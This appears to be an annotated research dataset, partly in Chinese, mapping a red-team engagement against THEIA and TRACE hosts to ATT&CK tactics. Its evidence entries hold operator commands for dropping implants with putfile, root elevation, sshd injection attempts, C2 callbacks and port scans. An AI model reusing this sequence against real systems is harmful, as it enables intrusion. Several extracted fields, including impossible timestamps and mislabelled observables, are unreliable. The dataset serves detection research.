  > - exploit: www.gatech.edu 104.228.117.212:80
  > - firefox: connection to 141.43.176.203:80
  > - firefox: connection to 146.153.68.151:80
  > - profile: connection to 161.116.88.72:80
  > - L2>nrtcp 7.149.198.40 80

- `3.3.5` Graph (lines 416-421)
#### 证据条目

1. `3_3_e001` | `narrative_comment` | `3.3.lead Section Lead` | lines `322-333`
   - Raw: Began attack with THEIA Ubuntu 12.04 x64 by exploiting Firefox 54.0.1 using a malicious ad server via the www.gatech.edu website. The exploit resulted in the drakon implant running in memory in the Firefox process with a connection out to the attacker operator console. The attacker used putfile to write a drakon implant executable binary to the target host's disk. The attacker then executed the drakon implant from the target disk using a privilege escalated execution capability to run the new process as root. The new root drakon implant process connected out to the operator console to give the attacker a 2nd shell to the target host, this time with root access. The attacker closed the non-root shell and switched over to the root shell. At this point the drakon implant stopped responding, and we lost connection to the THEIA host (as well as the open connection to the TRACE host from earlier today). The attacker gained access once again when Firefox browsed to www.gatech.edu. The attacker then wrote another file to disk to be used later and left the connection to the operator console open.
   - Time: `12.04` / `2018-04-10T12:04:00`
   - Observables: domain=www.gatech.edu; process_name=firefox; process_name=drakon; command=Began attack with THEIA Ubuntu 12.04 x64 by exploiting Firefox 54.0.1 using a malicious ad server via the www.gatech.edu website. The exploit resulted in the drakon implant running in memory in the Firefox process with a connection out to the attacker operator console. The attacker used putfile to write a drakon implant executable binary to the target host's disk. The attacker then executed the drakon implant from the target disk using a privilege escalated execution capability to run the new process as root. The new root drakon implant process connected out to the operator console to give the attacker a 2nd shell to the target host, this time with root access. The attacker closed the non-root shell and switched over to the root shell. At this point the drakon implant stopped responding, and we lost connection to the THEIA host (as well as the open connection to the TRACE host from earlier today). The attacker gained access once again when Firefox browsed to www.gatech.edu. The attacker then wrote another file to disk to be used later and left the connection to the operator console open.; host=TRACE; host=THEIA
1. `3_3_e002` | `narrative_comment` | `3.3.1 Comments` | lines `337-342`
   - Raw: Our second target was the Linux development computers. Had we been able to persist on the CADETS host, we would have performed some network recon to discover the THEIA and TRACE hosts. In this case, since that did not happen, we instead used an advertisement server to host a malicious advertisement. In this case, the exploit was sent via an ad on the www.allstate.com website. The goal of the attack was to drop a malicious payload to disk which would be triggered later during the engagement period via a different access method.
   - Time: `-` / `-`
   - Observables: domain=www.allstate.com; host=CADETS; host=TRACE; host=THEIA
1. `3_3_e003` | `narrative_comment` | `3.3.1 Comments` | lines `344-353`
   - Raw: When we first tried to run the attack against the THEIA host, we found that benign activity had been failing to connect via SSH or VNC because the THEIA host had been locked up and unresponsive for some unknown amount of time. The TA2 performers and BBN realized that THEIA's publishing had falled behind and was publishing old data, which is why no one had detected that the THEIA host was unresponsive. BBN rebooted the THEIA host for us, and we re-setup it up. We waited a few more hours and tried attacking again in the afternoon. Similar to TRACE, Firefox 54.0.1 crashed a few times before the exploit finally worked. Firefox also locked up the system and had to be killed via an SSH connection before the exploit eventually worked. This did not happen during testing, but there appears to be some conflict or issue between the Firefox 54.0.1 backdoor and the BBN range with benign activity and TA1 performer technologies running. Additional testing is required to figure this out.
   - Time: `-` / `-`
   - Observables: process_name=firefox; host=TRACE; host=THEIA
1. `3_3_e004` | `event_log` | `3.3.2 Event Log` | lines `357-357`
   - Raw: 09:58 THEIA is unreachable, going to restart
   - Time: `09:58` / `2018-04-10T09:58:00`
   - Observables: host=THEIA
1. `3_3_e005` | `event_log` | `3.3.2 Event Log` | lines `358-358`
   - Raw: 13:41 www.allstate.com crash
   - Time: `13:41` / `2018-04-10T13:41:00`
   - Observables: domain=www.allstate.com
1. `3_3_e006` | `event_log` | `3.3.2 Event Log` | lines `359-359`
   - Raw: 13:41 www.allstate.com crash
   - Time: `13:41` / `2018-04-10T13:41:00`
   - Observables: domain=www.allstate.com
1. `3_3_e007` | `event_log` | `3.3.2 Event Log` | lines `360-360`
   - Raw: 13:41 www.allstate.com crash
   - Time: `13:41` / `2018-04-10T13:41:00`
   - Observables: domain=www.allstate.com
1. `3_3_e008` | `event_log` | `3.3.2 Event Log` | lines `361-361`
   - Raw: 13:41 Failed 3/4 times, firefox crashed, system locked up
   - Time: `13:41` / `2018-04-10T13:41:00`
   - Observables: process_name=firefox
1. `3_3_e009` | `event_log` | `3.3.2 Event Log` | lines `362-362`
   - Raw: admin@ta1-theia-target:~$ ps -aux | grep firefox
   - Time: `-` / `-`
   - Observables: user=admin@ta1-theia-target; process_name=firefox; command=admin@ta1-theia-target:~$ ps -aux | grep firefox; host=THEIA
1. `3_3_e010` | `event_log` | `3.3.2 Event Log` | lines `363-363`
   - Raw: admin@ta1-theia-target:~$ sudo kill -9 5771
   - Time: `-` / `-`
   - Observables: user=admin@ta1-theia-target; host=THEIA
1. `3_3_e011` | `event_log` | `3.3.2 Event Log` | lines `364-364`
   - Raw: 14:31 www.gatech.edu
   - Time: `14:31` / `2018-04-10T14:31:00`
   - Observables: domain=www.gatech.edu
1. `3_3_e012` | `event_log` | `3.3.2 Event Log` | lines `365-365`
   - Raw: 14:31 Shell from THEIA
   - Time: `14:31` / `2018-04-10T14:31:00`
   - Observables: host=THEIA
1. `3_3_e013` | `event_log` | `3.3.2 Event Log` | lines `366-366`
   - Raw: 14:35 putfile clean
   - Time: `14:35` / `2018-04-10T14:35:00`
   - Observables: command=14:35 putfile clean
1. `3_3_e014` | `event_log` | `3.3.2 Event Log` | lines `367-367`
   - Raw: 14:35 elevate clean
   - Time: `14:35` / `2018-04-10T14:35:00`
   - Observables: command=14:35 elevate clean
1. `3_3_e015` | `event_log` | `3.3.2 Event Log` | lines `368-368`
   - Raw: 14:35 quit
   - Time: `14:35` / `2018-04-10T14:35:00`
   - Observables: -
1. `3_3_e016` | `event_log` | `3.3.2 Event Log` | lines `369-369`
   - Raw: 14:35 connect back
   - Time: `14:35` / `2018-04-10T14:35:00`
   - Observables: -
1. `3_3_e017` | `event_log` | `3.3.2 Event Log` | lines `370-370`
   - Raw: 14:51 drakon (clean as root) stopped responding
   - Time: `14:51` / `2018-04-10T14:51:00`
   - Observables: process_name=drakon
1. `3_3_e018` | `event_log` | `3.3.2 Event Log` | lines `371-371`
   - Raw: 14:51 lost connection to TRACE when OC crashed
   - Time: `14:51` / `2018-04-10T14:51:00`
   - Observables: host=TRACE
1. `3_3_e019` | `event_log` | `3.3.2 Event Log` | lines `373-373`
   - Raw: 14:55 re-exploit gatech.edu
   - Time: `14:55` / `2018-04-10T14:55:00`
   - Observables: domain=gatech.edu
1. `3_3_e020` | `event_log` | `3.3.2 Event Log` | lines `374-374`
   - Raw: 14:55 putfile profile
   - Time: `14:55` / `2018-04-10T14:55:00`
   - Observables: command=14:55 putfile profile
1. `3_3_e021` | `event_log` | `3.3.2 Event Log` | lines `375-375`
   - Raw: putfile /var/log/xdev
   - Time: `-` / `-`
   - Observables: file_path=/var/log/xdev; command=putfile /var/log/xdev
1. `3_3_e022` | `event_log` | `3.3.2 Event Log` | lines `376-376`
   - Raw: Left connection L5 in OC2 open
   - Time: `-` / `-`
   - Observables: -
1. `3_3_e023` | `address` | `3.3.3 Addresses` | lines `380-380`
   - Raw: [eth0:890] 145.199.103.57:80 -> 128.55.12.167:8010 webserver (www.allstate.com)
   - Time: `57:80` / `2018-04-10T57:80:00`
   - Observables: ip_port=145.199.103.57:80; ip_port=128.55.12.167:8010; domain=www.allstate.com
1. `3_3_e024` | `address` | `3.3.3 Addresses` | lines `381-382`
   - Raw: [eth0:891] 61.130.69.232:80 -> 128.55.12.167:8011   shellcode_server (www.allstate.com)
   - Time: `55.12` / `2018-04-10T55:12:00`
   - Observables: ip_port=61.130.69.232:80; ip_port=128.55.12.167:8011; domain=www.allstate.com
1. `3_3_e025` | `address` | `3.3.3 Addresses` | lines `383-383`
   - Raw: [eth0:894] 5.214.163.155:80 -> 128.55.12.167:8014   libdrakon.linux.x64.so
   - Time: `55.12` / `2018-04-10T55:12:00`
   - Observables: ip_port=5.214.163.155:80; ip_port=128.55.12.167:8014; process_name=drakon
1. `3_3_e026` | `address` | `3.3.3 Addresses` | lines `384-384`
   - Raw: [eth0:896] 161.116.88.72:80 -> 128.55.12.167:8016   drakon.linux.x64
   - Time: `88.72` / `2018-04-10T88:72:00`
   - Observables: ip_port=161.116.88.72:80; ip_port=128.55.12.167:8016; domain=drakon.linux; process_name=drakon
1. `3_3_e027` | `address` | `3.3.3 Addresses` | lines `385-385`
   - Raw: [eth0:897] 146.153.68.151:80 -> 128.55.12.167:8017 loaderDrakon.linux.x64
   - Time: `55.12` / `2018-04-10T55:12:00`
   - Observables: ip_port=146.153.68.151:80; ip_port=128.55.12.167:8017; domain=loaderDrakon.linux; process_name=drakon; process_name=loaderdrakon
1. `3_3_e028` | `address` | `3.3.3 Addresses` | lines `386-386`
   - Raw: [eth0:898] 104.228.117.212:80 -> 128.55.12.167:8018 webserver (www.gatech.edu)
   - Time: `55.12` / `2018-04-10T55:12:00`
   - Observables: ip_port=104.228.117.212:80; ip_port=128.55.12.167:8018; domain=www.gatech.edu
1. `3_3_e029` | `address` | `3.3.3 Addresses` | lines `387-388`
   - Raw: [eth0:899] 141.43.176.203:80 -> 128.55.12.167:8019 shellcode_server (www.gatech.edu)
   - Time: `55.12` / `2018-04-10T55:12:00`
   - Observables: ip_port=141.43.176.203:80; ip_port=128.55.12.167:8019; domain=www.gatech.edu
1. `3_3_e030` | `address` | `3.3.3 Addresses` | lines `389-389`
   - Raw: [eth0:908] 7.149.198.40:80 -> 128.55.12.167:8028   netrecon (www.gatech.edu)
   - Time: `40:80` / `2018-04-10T40:80:00`
   - Observables: ip_port=7.149.198.40:80; ip_port=128.55.12.167:8028; domain=www.gatech.edu; process_name=netrecon
1. `3_3_e031` | `interaction_file` | `3.3.4.1 Files` | lines `395-395`
   - Raw: L4>putfile ./deploy/archive/drakon.linux.x64_161.116.88.72 clean
   - Time: `88.72` / `2018-04-10T88:72:00`
   - Observables: file_path=/deploy/archive/drakon.linux.x64_161.116.88.72; domain=drakon.linux; process_name=drakon; command=L4>putfile ./deploy/archive/drakon.linux.x64_161.116.88.72 clean
1. `3_3_e032` | `interaction_file` | `3.3.4.1 Files` | lines `396-396`
   - Raw: L4>rm clean
   - Time: `-` / `-`
   - Observables: -
1. `3_3_e033` | `interaction_file` | `3.3.4.1 Files` | lines `397-397`
   - Raw: L1>putfile ./deploy/archive/drakon.linux.x64_161.116.88.72 /home/admin/profile
   - Time: `88.72` / `2018-04-10T88:72:00`
   - Observables: file_path=/deploy/archive/drakon.linux.x64_161.116.88.72; file_path=/home/admin/profile; domain=drakon.linux; process_name=drakon; command=L1>putfile ./deploy/archive/drakon.linux.x64_161.116.88.72 /home/admin/profile
1. `3_3_e034` | `interaction_file` | `3.3.4.1 Files` | lines `398-398`
   - Raw: rm profile
   - Time: `-` / `-`
   - Observables: -
1. `3_3_e035` | `interaction_file` | `3.3.4.1 Files` | lines `399-399`
   - Raw: L2>putfile ./deploy/archive/libdrakon.linux.x64.so_5.214.163.155 xdev
   - Time: `-` / `-`
   - Observables: file_path=/deploy/archive/libdrakon.linux.x64.so_5.214.163.155; domain=libdrakon.linux; process_name=drakon; command=L2>putfile ./deploy/archive/libdrakon.linux.x64.so_5.214.163.155 xdev
1. `3_3_e036` | `interaction_process` | `3.3.4.2 Processes` | lines `403-403`
   - Raw: L4>elevate /home/admin/clean
   - Time: `-` / `-`
   - Observables: file_path=/home/admin/clean; command=L4>elevate /home/admin/clean
1. `3_3_e037` | `interaction_process` | `3.3.4.2 Processes` | lines `404-404`
   - Raw: L1>elevate /home/admin/profile
   - Time: `-` / `-`
   - Observables: file_path=/home/admin/profile; command=L1>elevate /home/admin/profile
1. `3_3_e038` | `interaction_connection` | `3.3.4.3 Connections` | lines `408-408`
   - Raw: exploit: www.allstate.com 145.199.103.57:80
   - Time: `57:80` / `2018-04-10T57:80:00`
   - Observables: ip_port=145.199.103.57:80; domain=www.allstate.com
1. `3_3_e039` | `interaction_connection` | `3.3.4.3 Connections` | lines `409-409`
   - Raw: firefox: connection to 61.130.69.232:80 (firefox crash?)
   - Time: `-` / `-`
   - Observables: ip_port=61.130.69.232:80; process_name=firefox
1. `3_3_e040` | `interaction_connection` | `3.3.4.3 Connections` | lines `410-410`
   - Raw: exploit: www.gatech.edu 104.228.117.212:80
   - Time: `-` / `-`
   - Observables: ip_port=104.228.117.212:80; domain=www.gatech.edu
1. `3_3_e041` | `interaction_connection` | `3.3.4.3 Connections` | lines `411-411`
   - Raw: firefox: connection to 141.43.176.203:80
   - Time: `-` / `-`
   - Observables: ip_port=141.43.176.203:80; process_name=firefox
1. `3_3_e042` | `interaction_connection` | `3.3.4.3 Connections` | lines `412-412`
   - Raw: firefox: connection to 146.153.68.151:80
   - Time: `-` / `-`
   - Observables: ip_port=146.153.68.151:80; process_name=firefox
1. `3_3_e043` | `interaction_connection` | `3.3.4.3 Connections` | lines `413-413`
   - Raw: profile: connection to 161.116.88.72:80
   - Time: `88.72` / `2018-04-10T88:72:00`
   - Observables: ip_port=161.116.88.72:80
1. `3_3_e044` | `interaction_connection` | `3.3.4.3 Connections` | lines `414-414`
   - Raw: L2>nrtcp 7.149.198.40 80
   - Time: `-` / `-`
   - Observables: -

### THEIA_20180412_1244_1326_03 / Section 3.11

- 标题：`20180412 THEIA – Browser Extension w/ Drakon Dropper`
- 状态：`confirmed`
- 时间精度：`minute_window`
- 时间窗：`2018-04-12T12:44:00` -> `2018-04-12T13:26:00`
- Markdown 行号：`852-964`
- 报告页：`20, 21`
- 攻击概述：THEIA 上的恶意浏览器扩展攻击通过写盘方式转成成功链：drakon 与 micro apt 分别落盘、注入尝试失败、micro 提权并回连，随后进行大规模端口扫描并删除 mail 落地物。
- 备注：窗口同时记录了 failed injection 与 successful micro path；confirmed tactics 只统计最终成功形成的攻击阶段。

#### 战术判定

| Tactic | Judgment | 含义 | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| INITIAL_ACCESS | confirmed | 初始进入 | 浏览器扩展 exploit 成功把攻击推进到盘上落地与后续控制。 | 3_11_e001, 3_11_e005, 3_11_e006 |
| EXECUTION | confirmed | 执行 | drakon/micro 载荷被写盘并继续执行。 | 3_11_e013, 3_11_e031, 3_11_e032, 3_11_e003, 3_11_e016, 3_11_e040 |
| PRIVILEGE_ESCALATION | confirmed | 提权 | micro apt 被明确提升为 root 权限进程。 | 3_11_e003, 3_11_e016, 3_11_e040 |
| COMMAND_AND_CONTROL | confirmed | 命令控制 | gtcache/drakon 与 micro listener 的外连共同说明已形成控制通道。 | 3_11_e001, 3_11_e017, 3_11_e024, 3_11_e041, 3_11_e044 |
| DISCOVERY | confirmed | 侦察发现 | whoami、ps 和多批次 APT>scan 同时覆盖身份、进程和网络侦察。 | 3_11_e007, 3_11_e008, 3_11_e009, 3_11_e001, 3_11_e045, 3_11_e050, 3_11_e051, 3_11_e052, 3_11_e053, 3_11_e054, 3_11_e055, 3_11_e056, 3_11_e057, 3_11_e058, 3_11_e059, 3_11_e060 |
| DEFENSE_EVASION | confirmed | 防御规避 | mail/xdev/wdev 等落地物被删除，属于明确的痕迹清理/落地物清理。 | 3_11_e018, 3_11_e028, 3_11_e029, 3_11_e030, 3_11_e033 |

#### Technique 判定

| Technique | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- |
| T1203 | confirmed | 恶意浏览器扩展 exploit 是窗口的进入方式。 | 3_11_e001, 3_11_e005, 3_11_e006 |
| T1071.001 | confirmed | gtcache/drakon 与 micro listener 通过 web 风格地址建立控制通信。 | 3_11_e001, 3_11_e017, 3_11_e024, 3_11_e041, 3_11_e044 |
| T1105 | confirmed | microapt/libdrakon 等模块被写盘导入目标。 | 3_11_e013, 3_11_e031, 3_11_e032 |
| T1046 | confirmed | APT>scan 明确对应网络服务侦察。 | 3_11_e001, 3_11_e045, 3_11_e050, 3_11_e051, 3_11_e052, 3_11_e053, 3_11_e054, 3_11_e055, 3_11_e056, 3_11_e057, 3_11_e058, 3_11_e059, 3_11_e060 |
| T1033 | confirmed | whoami 明确对应身份发现。 | 3_11_e007 |
| T1057 | confirmed | ps 与 sshd PID 枚举明确对应进程发现。 | 3_11_e008, 3_11_e009 |
| T1070.004 | confirmed | rm mail/xdev/wdev 是明确的文件删除清理。 | 3_11_e018, 3_11_e028, 3_11_e029, 3_11_e030, 3_11_e033 |

#### Behavior Chain

| Behavior ID | Action | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| browser_extension_exploit | exploit_delivery | confirmed | 浏览器扩展路径虽然没能把 drakon 留在内存里，但成功把后续载荷链推到了磁盘执行阶段。 | 3_11_e001, 3_11_e005, 3_11_e006 |
| payload_write | payload_write | confirmed | xdev/wdev/memtrace.so/mail 等文件均被明确写入。 | 3_11_e013, 3_11_e031, 3_11_e032 |
| payload_elevate | payload_elevate | confirmed | 正文明确写到 micro apt 被提升为 root 新进程，Event Log 也有 elevate /var/log/mail。 | 3_11_e003, 3_11_e016, 3_11_e040 |
| c2_callback | c2_callback | confirmed | gtcache/drakon 与 micro listener 的连接都被明确记录。 | 3_11_e001, 3_11_e017, 3_11_e024, 3_11_e041, 3_11_e044 |
| network_scan | scan | confirmed | APT>scan 列出了多个目标与端口范围。 | 3_11_e001, 3_11_e045, 3_11_e050, 3_11_e051, 3_11_e052, 3_11_e053, 3_11_e054, 3_11_e055, 3_11_e056, 3_11_e057, 3_11_e058, 3_11_e059, 3_11_e060 |
| cleanup_delete | file_delete | confirmed | xdev/wdev/mail 等临时或载荷相关文件都被删除。 | 3_11_e018, 3_11_e028, 3_11_e029, 3_11_e030, 3_11_e033 |
| inject_attempt | inject_attempt | attempted | 多次向 sshd 注入 xdev/wdev/memtrace.so 失败。 | 3_11_e010, 3_11_e012, 3_11_e014, 3_11_e034, 3_11_e035, 3_11_e036, 3_11_e037, 3_11_e038, 3_11_e039 |
| identity_discovery | identity_discovery | confirmed | Event Log 中有 whoami。 | 3_11_e007 |
| process_discovery | process_discovery | confirmed | Event Log 中有 ps 与 sshd PID。 | 3_11_e008, 3_11_e009 |

#### 显式观测

- `process_name` / `firefox`  Evidence: `3_11_e001, 3_11_e026, 3_11_e043`  Raw: firefox
- `process_name` / `drakon`  Evidence: `3_11_e001, 3_11_e003, 3_11_e005, 3_11_e006, 3_11_e020, 3_11_e021, 3_11_e031`  Raw: drakon
- `process_name` / `micro`  Evidence: `3_11_e001, 3_11_e002, 3_11_e003, 3_11_e015, 3_11_e024, 3_11_e032`  Raw: micro
- `host` / `THEIA`  Evidence: `3_11_e001, 3_11_e003, 3_11_e021, 3_11_e022, 3_11_e023, 3_11_e024`  Raw: THEIA
- `email_artifact` / `micro apt`  Evidence: `3_11_e001, 3_11_e002, 3_11_e003`  Raw: micro apt
- `email_artifact` / `Micro apt`  Evidence: `3_11_e001`  Raw: Micro apt
- `process_name` / `sshd`  Evidence: `3_11_e002, 3_11_e003, 3_11_e009, 3_11_e014`  Raw: sshd
- `command` / `The goal of this attack was to resume the prior attack by injecting the file that was previously dropped to disk into the sshd process. From there, the hosts on the target network would be portscanned using the micro apt implant.`  Evidence: `3_11_e002`  Raw: inject
- `command` / `The plan did not work as expected because of process injection failing. The connection was left open from the previous attack and remained open. We used the browser extension to write the drakon implant executable to disk. It connected back, and we now had 2 open connections to the THEIA host, the first one from a few days ago running as a new process with root privileges and the second one running as a new process executed from disk with standard user privileges. We tried to load the file staged on disk into sshd process memory but could not do so due to issues we were having with process injection on the target machines during the engagement. We settled for writing micro apt to disk and elevating it as a new process with root privileges.`  Evidence: `3_11_e003`  Raw: inject
- `domain` / `www.gatech.edu`  Evidence: `3_11_e005, 3_11_e006, 3_11_e025, 3_11_e042`  Raw: www.gatech.edu
- `process_name` / `loaderdrakon`  Evidence: `3_11_e005, 3_11_e021`  Raw: loaderdrakon
- `command` / `1251 whoami`  Evidence: `3_11_e007`  Raw: whoami
- `command` / `1251 ps`  Evidence: `3_11_e008`  Raw: ps
- `file_path` / `/var/log/xdev`  Evidence: `3_11_e010, 3_11_e011, 3_11_e034`  Raw: /var/log/xdev
- `command` / `1253 inject /var/log/xdev 1226 (missed connect out)`  Evidence: `3_11_e010`  Raw: inject
- `file_path` / `/var/log/wdev`  Evidence: `3_11_e012, 3_11_e035`  Raw: /var/log/wdev
- `command` / `1257 inject /var/log/wdev 1226 (missed connect out)`  Evidence: `3_11_e012`  Raw: inject
- `file_path` / `/tmp/memtrace.so`  Evidence: `3_11_e013, 3_11_e036, 3_11_e037, 3_11_e038, 3_11_e039`  Raw: /tmp/memtrace.so
- `command` / `1303 putfile /tmp/memtrace.so`  Evidence: `3_11_e013`  Raw: putfile
- `host` / `TRACE`  Evidence: `3_11_e013, 3_11_e020, 3_11_e031, 3_11_e036, 3_11_e037, 3_11_e038, 3_11_e039`  Raw: TRACE
- `command` / `1309 inject multiple times (failed, sshd crash?)`  Evidence: `3_11_e014`  Raw: inject
- `file_path` / `/var/log/mail`  Evidence: `3_11_e015, 3_11_e016, 3_11_e040`  Raw: /var/log/mail
- `command` / `1317 putfile /var/log/mail (micro)`  Evidence: `3_11_e015`  Raw: putfile
- `command` / `1317 elevate /var/log/mail 149.52.198.23`  Evidence: `3_11_e016`  Raw: elevate
- `ip_port` / `5.214.163.155:80`  Evidence: `3_11_e020`  Raw: 5.214.163.155:80
- `ip_port` / `128.55.12.167:8014`  Evidence: `3_11_e020`  Raw: 128.55.12.167:8014
- `ip_port` / `146.153.68.151:80`  Evidence: `3_11_e021`  Raw: 146.153.68.151:80
- `ip_port` / `128.55.12.167:8017`  Evidence: `3_11_e021`  Raw: 128.55.12.167:8017
- `domain` / `loaderDrakon.linux`  Evidence: `3_11_e021`  Raw: loaderDrakon.linux
- `ip_port` / `104.228.117.212:80`  Evidence: `3_11_e022, 3_11_e025, 3_11_e042`  Raw: 104.228.117.212:80
- `ip_port` / `128.55.12.167:8018`  Evidence: `3_11_e022`  Raw: 128.55.12.167:8018
- `ip_port` / `141.43.176.203:80`  Evidence: `3_11_e023, 3_11_e026, 3_11_e043`  Raw: 141.43.176.203:80
- `ip_port` / `128.55.12.167:8019`  Evidence: `3_11_e023`  Raw: 128.55.12.167:8019
- `ip_port` / `149.52.198.23:80`  Evidence: `3_11_e024`  Raw: 149.52.198.23:80
- `ip_port` / `128.55.12.167:8060`  Evidence: `3_11_e024`  Raw: 128.55.12.167:8060
- `file_path` / `/deploy/archive/libdrakon.linux.x64.so_5.214.163.155`  Evidence: `3_11_e031`  Raw: /deploy/archive/libdrakon.linux.x64.so_5.214.163.155
- `domain` / `libdrakon.linux`  Evidence: `3_11_e031`  Raw: libdrakon.linux
- `command` / `L3>putfile ./deploy/archive/libdrakon.linux.x64.so_5.214.163.155 memtrace.so`  Evidence: `3_11_e031`  Raw: putfile
- `file_path` / `/deploy/archive/microapt.linux.x64_149.52.198.23`  Evidence: `3_11_e032`  Raw: /deploy/archive/microapt.linux.x64_149.52.198.23
- `domain` / `microapt.linux`  Evidence: `3_11_e032`  Raw: microapt.linux
- `command` / `L2>putfile ./deploy/archive/microapt.linux.x64_149.52.198.23 mail`  Evidence: `3_11_e032`  Raw: putfile
- `email_artifact` / `microapt`  Evidence: `3_11_e032`  Raw: microapt
- `command` / `L3>inject /var/log/xdev 1226 (failed)`  Evidence: `3_11_e034`  Raw: inject
- `command` / `L3>inject /var/log/wdev 1226 (failed)`  Evidence: `3_11_e035`  Raw: inject
- `command` / `L3>inject /tmp/memtrace.so 1226 (failed)`  Evidence: `3_11_e036`  Raw: inject
- `command` / `L3>inject /tmp/memtrace.so 13776 (failed)`  Evidence: `3_11_e037`  Raw: inject
- `command` / `L3>inject /tmp/memtrace.so 14204 (failed)`  Evidence: `3_11_e038`  Raw: inject
- `command` / `L3>inject /tmp/memtrace.so 14228 (failed)`  Evidence: `3_11_e039`  Raw: inject
- `command` / `L2>elevate /var/log/mail`  Evidence: `3_11_e040`  Raw: elevate

#### 原始子节摘录

- `3.11.lead` Section Lead (lines 854-860)

  > Continued attack against THEIA by exploiting the target via the malicious pass manager browser
  > extension in Firefox 54.0.1. The attacker had previously tried to load drakon into the memory of the
  > browser extension on Windows, but this was unsuccessful. So, the attacker resorted to writing the
  > drakon implant executable to disk on the target upon exploiting the browser extension. While noisier
  > than the originally planned attack, this achieved the same purpose. The attacker was able to run micro
  > apt from the target disk. Micro apt connected out to the micro C2 listener. The attacker then used
  > micro apt to perform a portscan of the known hosts on the target network.

- `3.11.1` Comments (lines 862-876)

  > The goal of this attack was to resume the prior attack by injecting the file that was previously dropped to
  > disk into the sshd process. From there, the hosts on the target network would be portscanned using the
  > micro apt implant.
  > The plan did not work as expected because of process injection failing. The connection was left open
  > from the previous attack and remained open. We used the browser extension to write the drakon
  > implant executable to disk. It connected back, and we now had 2 open connections to the THEIA host,
  > the first one from a few days ago running as a new process with root privileges and the second one
  > running as a new process executed from disk with standard user privileges. We tried to load the file
  > staged on disk into sshd process memory but could not do so due to issues we were having with process
  > injection on the target machines during the engagement. We settled for writing micro apt to disk and
  > elevating it as a new process with root privileges.

- `3.11.2` Event Log (lines 877-896)

  > - 1244 log
  > - 1244 www.gatech.edu loaderDrakon browser ext
  > - 1250 www.gatech.edu drakon browser ext
  > - 1251 whoami
  > - 1251 ps
  > - * 1226    1   root (sshd)
  > - 1253 inject /var/log/xdev 1226 (missed connect out)
  > - 1257 L3: cp /var/log/xdev wdev
  > - 1257 inject /var/log/wdev 1226 (missed connect out)
  > - 1303 putfile /tmp/memtrace.so
  > - 1309 inject multiple times (failed, sshd crash?)
  > - 1317 putfile /var/log/mail (micro)
  > - 1317 elevate /var/log/mail 149.52.198.23
  > - 1317 c2 connection
  > - 1326 rm mail
  > - 1326 quit

- `3.11.3` Addresses (lines 897-905)

  > - [eth0:894] 5.214.163.155:80 -> 128.55.12.167:8014  TRACE libdrakon.linux.x64.so
  > (failed)
  > - [eth0:897] 146.153.68.151:80 -> 128.55.12.167:8017 THEIA loaderDrakon.linux.x64
  > - [eth0:898] 104.228.117.212:80 -> 128.55.12.167:8018 THEIA webserver
  > - [eth0:899] 141.43.176.203:80 -> 128.55.12.167:8019 THEIA shellcode_server
  > - [eth0:950] 149.52.198.23:80 -> 128.55.12.167:8060  THEIA micro

- `3.11.4.1` Connections (lines 908-911)

  > - exploit: www.gatech.edu 104.228.117.212:80
  > - Firefox: connection to 141.43.176.203:80

- `3.11.5.1` Files (lines 914-921)

  > - L2>cp xdev wdev
  > - L3>rm xdev (failed)
  > - L2>rm xdev
  > - L2>rm wdev
  > - L3>putfile ./deploy/archive/libdrakon.linux.x64.so_5.214.163.155 memtrace.so
  > - L2>putfile ./deploy/archive/microapt.linux.x64_149.52.198.23 mail
  > - L2>rm mail

- `3.11.5.2` Processes (lines 922-930)

  > - L3>inject /var/log/xdev 1226 (failed)
  > - L3>inject /var/log/wdev 1226 (failed)
  > - L3>inject /tmp/memtrace.so 1226 (failed)
  > - L3>inject /tmp/memtrace.so 13776 (failed)
  > - L3>inject /tmp/memtrace.so 14204 (failed)
  > - L3>inject /tmp/memtrace.so 14228 (failed)
  > - L2>elevate /var/log/mail

- `3.11.5.3` Connections (lines 931-933)

  > - gtcache: connection to 146.153.68.151

- `3.11.6.1` Connections (lines 936-960)

  > - exploit: www.gatech.edu 104.228.117.212:80
  > - Firefox: connection to 141.43.176.203:80
  > - gtcache: connection to 146.153.68.151
  > - APT>scan 128.55.12.73 22 6000
  > - APT>scan 128.55.12.166 22 6000
  > - APT>scan 128.55.12.67 22 6000
  > - APT>scan 128.55.12.67 3000 6000
  > - APT>scan 128.55.12.67 4000 6000
  > - APT>scan 128.55.12.141 22 1000
  > - APT>scan 128.55.12.141 1000 2000
  > - APT>scan 128.55.12.141 2000 3000
  > - APT>scan 128.55.12.141 3000 4000
  > - APT>scan 128.55.12.141 3388 3390
  > - APT>scan 128.55.12.110 22 1000
  > - APT>scan 128.55.12.110 200 1000
  > - APT>scan 128.55.12.110 1000 3000
  > - APT>scan 128.55.12.110 3000 5000
  > - APT>scan 128.55.12.110 5000 6000
  > - APT>scan 128.55.12.110 22 6000
  > - APT>scan 128.55.12.118 22 6000
  > - APT>scan 128.55.12.10 22 6000
  > - APT>scan 128.55.12.1 22 6000
  > - APT>scan 128.55.12.55 22 6000

- `3.11.7` Graph (lines 961-964)
#### 证据条目

1. `3_11_e001` | `narrative_comment` | `3.11.lead Section Lead` | lines `854-860`
   - Raw: Continued attack against THEIA by exploiting the target via the malicious pass manager browser extension in Firefox 54.0.1. The attacker had previously tried to load drakon into the memory of the browser extension on Windows, but this was unsuccessful. So, the attacker resorted to writing the drakon implant executable to disk on the target upon exploiting the browser extension. While noisier than the originally planned attack, this achieved the same purpose. The attacker was able to run micro apt from the target disk. Micro apt connected out to the micro C2 listener. The attacker then used micro apt to perform a portscan of the known hosts on the target network.
   - Time: `-` / `-`
   - Observables: process_name=firefox; process_name=drakon; process_name=micro; host=THEIA; email_artifact=micro apt; email_artifact=Micro apt
1. `3_11_e002` | `narrative_comment` | `3.11.1 Comments` | lines `864-866`
   - Raw: The goal of this attack was to resume the prior attack by injecting the file that was previously dropped to disk into the sshd process. From there, the hosts on the target network would be portscanned using the micro apt implant.
   - Time: `-` / `-`
   - Observables: process_name=sshd; process_name=micro; command=The goal of this attack was to resume the prior attack by injecting the file that was previously dropped to disk into the sshd process. From there, the hosts on the target network would be portscanned using the micro apt implant.; email_artifact=micro apt
1. `3_11_e003` | `narrative_comment` | `3.11.1 Comments` | lines `868-875`
